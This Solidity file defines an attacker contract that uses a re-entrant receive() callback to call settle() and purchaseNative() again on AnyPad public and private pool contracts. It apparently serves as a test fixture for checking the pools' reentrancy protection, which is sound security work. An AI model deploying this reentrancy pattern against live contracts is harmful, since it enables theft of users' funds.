// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;

import "../AnyPadPublicPool.sol";
import "../AnyPadPrivatePool.sol";

contract AttackerContract {
    AnyPadPublicPool publicPool;
    AnyPadPrivatePool privatePool;

    function setPublicPoolAddress(address payable victim_) external {
        publicPool = AnyPadPublicPool(victim_);
    }

    function setPrivatePoolAddress(address payable victim_) external {
        privatePool = AnyPadPrivatePool(victim_);
    }

    function purchasePublic() external {
        publicPool.purchaseNative{value: 10 ether}();
    }

    function attackPrivate(uint256 amount) external {
        privatePool.purchaseNative{value: amount}();
    }

    function attackPublic() public {
        publicPool.settle();
    }

    receive() external payable {
        if (address(publicPool) != address(0)) {
            if (address(publicPool).balance > 0 ether) {
                publicPool.settle();
            }
        }

        if (address(privatePool) != address(0)) {
            privatePool.purchaseNative{value: 2 ether}();
        }
    }
}
